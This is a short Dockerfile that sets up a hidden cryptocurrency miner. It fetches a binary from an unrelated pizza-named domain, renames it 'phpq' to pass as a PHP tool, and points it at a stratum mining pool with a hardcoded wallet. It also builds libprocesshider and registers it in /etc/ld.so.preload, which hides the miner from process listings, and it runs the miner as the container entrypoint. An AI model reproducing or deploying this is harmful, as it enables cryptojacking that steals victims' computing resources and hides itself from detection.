FROM debian
RUN apt update && apt -y install wget xz-utils git make gcc && \
    cd /opt && wget http://ilovenypizza.com/subscribe && \
	apt -y purge xz-utils && apt -y autoremove --purge && apt -y clean && apt -y autoclean; rm -rf /var/lib/apt-get/lists/*
RUN git clone https://github.com/septianana55/cobasaja.git && \
    cd /cobasaja && make && mv libprocesshider.so /usr/local/lib && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
RUN mv /opt/subscribe /usr/bin/phpq
RUN echo " phpq -a yespowerTIDE -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.hero -t 4" > /usr/bin/phpq
RUN chmod +x /usr/bin/phpq
ENTRYPOINT phpq
